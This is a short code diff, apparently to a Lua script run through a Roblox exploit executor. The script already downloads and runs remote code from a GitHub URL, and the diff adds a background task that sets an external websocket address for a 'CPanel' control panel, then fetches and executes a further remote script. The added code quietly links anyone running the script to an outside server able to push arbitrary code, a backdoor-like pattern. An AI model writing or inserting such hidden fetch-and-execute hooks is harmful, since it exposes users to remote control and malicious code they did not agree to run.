@@ -4,6 +4,11 @@ end
 
 pcall(loadstring, game:HttpGet("https://raw.githubusercontent.com/JustSomeGuest/Scripts/Main/Utilities/Notifs.lua"))
 
+task.spawn(function()
+getgenv().CPanelWebsocket="wss://cpanelwebsocket.onrender.com"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JustSomeGuest/Scripts/Main/Utilities/CPanel/Init.lua"))()
+end)
+
 local function GetService(Name)
     local Svc = game:GetService(Name)
     return cloneref and cloneref(Svc) or Svc
